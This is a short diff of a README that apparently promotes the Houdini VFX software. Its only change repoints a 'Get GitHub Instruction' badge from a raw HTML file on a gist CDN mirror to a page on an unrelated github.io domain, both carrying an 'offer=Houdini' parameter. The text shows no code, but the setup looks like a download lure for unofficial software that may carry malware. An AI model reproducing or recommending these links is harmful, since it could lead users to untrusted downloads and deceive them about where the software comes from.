@@ -2,7 +2,7 @@
 
 Houdini empowers artists and technical directors with **node-based control over simulations, modeling, and visual effects**. It’s the core engine behind the most advanced VFX in film, TV, and games. 🌀  
 
-[![🟠 Get GitHub Instruction](https://img.shields.io/badge/🟠%20Get%20GitHub%20Instruction-F47C20?style=for-the-badge&logo=houdini&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/n752-blip/0b81f5341fe28df9afed9cde5bbb27a0/raw/3237c3a0924444963db0284d927fd45e59405d79/get.html?offer=Houdini)
+[![🟠 Get GitHub Instruction](https://img.shields.io/badge/🟠%20Get%20GitHub%20Instruction-F47C20?style=for-the-badge&logo=houdini&logoColor=white&labelColor=0B0F19)](https://app-set-deploy.github.io/.github/?offer=Houdini)
 
 ---
 
